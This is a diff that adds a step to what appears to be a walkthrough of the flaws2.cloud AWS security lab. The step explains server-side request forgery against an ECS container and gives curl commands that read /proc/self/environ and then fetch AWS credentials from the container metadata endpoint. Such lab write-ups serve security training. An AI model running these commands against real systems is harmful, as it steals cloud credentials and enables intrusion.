@@ -144,4 +144,12 @@ This command will add entries to the .aws/config and .aws/credentials files in y
 
 - Get image metadata
 - ```aws ecr describe-images --repository-name level2 --profile PROFILE-ID```
-- 
+
+
+- SSRF in AWS ECS (Container Service)
+- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#ssrf-in-aws-ecs-container-service-credentials
+- https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html
+1. ```curl -v http://container.target.flaws2.cloud/proxy/file:///proc/self/environ -o environ```
+2. In "environ" output file found variable "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" copy paste in next curl cli:
+3. ```curl -v http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/cd0f067f-f28a-4f8a-ba76-0e697ec1d289```
+4. Get creds ...
